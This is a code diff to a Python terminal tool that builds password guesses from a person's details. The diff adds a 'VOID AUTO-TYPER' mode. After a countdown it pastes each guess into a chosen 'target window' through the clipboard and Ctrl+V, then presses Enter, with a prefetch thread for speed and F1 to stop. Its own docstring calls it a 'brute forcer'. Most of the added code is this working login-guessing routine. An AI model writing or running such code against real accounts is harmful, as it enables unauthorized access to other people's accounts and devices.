@@ -32,10 +32,11 @@ import re
 import subprocess
 import sys
 import time
+import threading
 
 
 def _ensure_deps():
-    for mod, pkg in [("rich", "rich"), ("pyfiglet", "pyfiglet")]:
+    for mod, pkg in [("rich","rich"),("pyfiglet","pyfiglet"),("pynput","pynput"),("pyperclip","pyperclip")]:
         try:
             __import__(mod)
         except ImportError:
@@ -594,6 +595,178 @@ def numbered_menu(options: list[tuple[str, str]], multi: bool = True) -> list[in
 
 
 # ─────────────────────────────────────────────────────────────────────────────
+#  Auto-Typer (F1 to stop)
+# ─────────────────────────────────────────────────────────────────────────────
+
+_stop_typing = threading.Event()
+
+def _start_f1_listener():
+    """Background thread that sets _stop_typing when F1 is pressed."""
+    try:
+        from pynput.keyboard import Key, Listener
+        def on_press(key):
+            if key == Key.f1:
+                _stop_typing.set()
+                return False
+        threading.Thread(
+            target=lambda: Listener(on_press=on_press).start(),
+            daemon=True).start()
+    except Exception as e:
+        console.print(f"  [dim red]F1 listener unavailable: {e}[/]")
+
+def _auto_type_guesses(guesses: list, delay_ms: int, press_enter: bool, countdown: int):
+    """
+    Clipboard-paste brute forcer — fastest possible method.
+
+    Instead of typing character-by-character (slow), it:
+      1. Copies the password to clipboard
+      2. Sends Ctrl+V to paste instantly (no per-character delay)
+      3. Optionally sends Enter
+    A prefetch thread pre-loads the NEXT password into the clipboard queue
+    so the main thread never waits on clipboard writes.
+    F1 stops everything instantly.
+    """
+    import queue as _queue
+    from rich.live  import Live
+    from rich.table import Table
+
+    try:
+        import pyperclip
+        from pynput.keyboard import Controller, Key, HotKey
+    except ImportError as e:
+        console.print(f"  [bold red][!][/]  Missing dep: {e} — run pip install pynput pyperclip")
+        return
+
+    _stop_typing.clear()
+    _start_f1_listener()
+
+    # ── countdown ─────────────────────────────────────────────────────────────
+    console.print()
+    for i in range(countdown, 0, -1):
+        if _stop_typing.is_set():
+            console.print("\n  [yellow]Cancelled.[/]"); return
+        console.print(
+            f"\r  [bold bright_red][!][/]  "
+            f"[bold white]Switch to target window — starting in "
+            f"[bright_red]{i}[/]s  (F1 cancels)[/]",
+            end="")
+        time.sleep(1)
+    if _stop_typing.is_set():
+        console.print("\n  [yellow]Cancelled.[/]"); return
+    console.print(
+        f"\r  [bold bright_red][!!!][/]  "
+        f"[bold bright_red]PASTING — F1 to stop                              [/]")
+    console.print()
+
+    kb      = Controller()
+    delay_s = max(delay_ms, 0) / 1000
+    total   = len(guesses)
+    stats   = {"done": 0, "current": "", "start": time.time()}
+
+    # Prefetch queue — prefetch thread writes clipboard; typer thread reads
+    clip_q  = _queue.Queue(maxsize=2)
+
+    # ── prefetch thread: pre-loads clipboard one password ahead ───────────────
+    def _prefetch():
+        for pw, _ in guesses:
+            if _stop_typing.is_set():
+                break
+            clip_q.put(pw)   # blocks if queue full (typer is keeping up)
+        clip_q.put(None)     # sentinel
+
+    threading.Thread(target=_prefetch, daemon=True).start()
+
+    # ── panel builder ─────────────────────────────────────────────────────────
+    def _panel():
+        elapsed = max(time.time() - stats["start"], 0.001)
+        done    = stats["done"]
+        pct     = done / total if total else 0
+        filled  = max(0, min(int(pct * 30), 30))
+
+        bar = Text()
+        bar.append("█" * filled,        style="bright_red")
+        bar.append("░" * (30 - filled), style="dim")
+
+        speed = f"{done/elapsed:.1f} pw/s" if done else "–"
+
+        tbl = Table.grid(padding=(0, 2))
+        tbl.add_column(); tbl.add_column()
+        tbl.add_column(); tbl.add_column()
+        tbl.add_row(
+            Text("TRIED",   style="dim"), Text(f"{done:,} / {total:,}", style="bold white"),
+            Text("ELAPSED", style="dim"), Text(f"{elapsed:.0f}s",       style="bold white"),
+        )
+        tbl.add_row(
+            Text("SPEED",   style="dim"), Text(speed,                   style="bold bright_red"),
+            Text("DELAY",   style="dim"), Text(f"{delay_ms}ms",         style="bold white"),
+        )
+        tbl.add_row(
+            Text("METHOD",  style="dim"), Text("Clipboard paste (Ctrl+V)", style="dim white"),
+            Text("",        style=""),    Text("",                      style=""),
+        )
+
+        cur = Text()
+        cur.append("  CURRENT  ", style="bold white")
+        cur.append(stats["current"][:64], style="bold yellow")
+
+        prog = Text()
+        prog.append("  PROGRESS ", style="bold white")
+        prog.append_text(bar)
+        prog.append(f"  {pct*100:.1f}%", style="bold bright_red")
+
+        from rich.console import Group
+        return Panel(
+            Group(tbl, Text(""), prog, cur, Text(""),
+                  Text("  F1 = stop instantly", style="dim red")),
+            title="[bold bright_red]  VOID AUTO-TYPER  —  CLIPBOARD PASTE  [/]",
+            border_style="bright_red",
+            box=box.DOUBLE_EDGE,
+        )
+
+    # ── main paste loop ───────────────────────────────────────────────────────
+    try:
+        with Live(console=console, refresh_per_second=8, screen=False) as live:
+            while not _stop_typing.is_set():
+                pw = clip_q.get()
+                if pw is None:       # sentinel — all passwords done
+                    break
+
+                stats["current"] = pw
+                stats["done"]   += 1
+
+                # Copy to clipboard and paste — much faster than kb.type()
+                pyperclip.copy(pw)
+                with kb.pressed(Key.ctrl):
+                    kb.tap('v')
+
+                if press_enter:
+                    kb.tap(Key.enter)
+
+                live.update(_panel())
+
+                if delay_s > 0:
+                    deadline = time.time() + delay_s
+                    while time.time() < deadline:
+                        if _stop_typing.is_set(): break
+                        time.sleep(0.001)    # 1ms resolution
+
+    except Exception as e:
+        console.print(f"\n  [bold red][!][/]  Typer error: {e}\n")
+        return
+
+    console.print()
+    console.print(Rule("[bold bright_red]  AUTO-TYPER DONE  [/]", style="bright_red"))
+    console.print(f"  [dim]Tried    [/]  [bold white]{stats['done']:,} / {total:,}[/]")
+    console.print(f"  [dim]Last pw  [/]  [bold yellow]{stats['current']}[/]")
+    if _stop_typing.is_set():
+        console.print(f"  [dim]Stopped  [/]  [bold bright_red]F1[/]")
+    else:
+        console.print(f"  [dim]Status   [/]  [bold bright_green]Wordlist exhausted[/]")
+    console.print()
+    console.print(Rule(style="bright_red"))
+
+
+# ─────────────────────────────────────────────────────────────────────────────
 #  Strength tips
 # ─────────────────────────────────────────────────────────────────────────────
 
@@ -730,6 +903,59 @@ def main():
         f"[bold white]✦  {len(guesses):,} candidate guesses built  ✦[/]\n"
         "[dim]from all the details you provided[/]",
         border_style="bright_red"))
+
+    # ── mode selection ────────────────────────────────────────────────────────
+    section("STEP 4  —  CHOOSE MODE")
+    console.print()
+    console.print("  [bright_red][1][/]  [bold white]Manual check[/]   [dim]— shows each guess, you press y/n to match[/]")
+    console.print("  [bright_red][2][/]  [bold white]Auto-type[/]      [dim]— types passwords into your target window · F1 to stop[/]")
+    console.print()
+    try:
+        mode_choice = console.input("  [bright_red]▸[/] [bold red]Mode[/]: ").strip()
+    except EOFError:
+        mode_choice = "1"
+
+    if mode_choice == "2":
+        console.print()
+        try:
+            delay_raw = console.input(
+                "  [bright_red]▸[/] [bold red]Delay between passwords ms (default 10, min 0)[/]: ").strip()
+            delay_ms = max(0, int(delay_raw)) if delay_raw.isdigit() else 10
+        except EOFError:
+            delay_ms = 300
+
+        try:
+            enter_raw = console.input(
+                "  [bright_red]▸[/] [bold red]Press Enter after each password? (Y/n)[/]: ").strip().lower()
+            press_enter = enter_raw not in ("n", "no")
+        except EOFError:
+            press_enter = True
+
+        try:
+            cd_raw = console.input(
+                "  [bright_red]▸[/] [bold red]Seconds to switch window (default 5)[/]: ").strip()
+            cd_secs = max(1, int(cd_raw)) if cd_raw.isdigit() else 5
+        except EOFError:
+            cd_secs = 5
+
+        console.print()
+        console.print(Rule("[dim red]  CONFIRM  [/]", style="dim red"))
+        console.print(f"  [dim]Passwords [/]  [bold white]{len(guesses):,}[/]")
+        console.print(f"  [dim]Delay     [/]  [bold white]{delay_ms}ms[/]  [dim]per attempt[/]")
+        console.print(f"  [dim]Enter key [/]  [bold white]{'YES' if press_enter else 'NO'}[/]")
+        console.print(f"  [dim]Countdown [/]  [bold white]{cd_secs}s[/]  [dim]then starts typing[/]")
+        console.print(f"  [dim]Stop      [/]  [bold bright_red]F1[/]  [dim]— works even when target window is focused[/]")
+        console.print()
+        try:
+            go = console.input("  [bright_red]▸[/] [bold red]Start? (Y/n)[/]: ").strip().lower()
+        except EOFError:
+            go = "y"
+        if go in ("n", "no"):
+            console.print("\n  [yellow]Aborted.[/]\n")
+            return
+
+        _auto_type_guesses(guesses, delay_ms, press_enter, cd_secs)
+        return
 
     section("STEP 4  —  CHECK EACH GUESS AGAINST YOUR REAL PASSWORD")
     console.print()
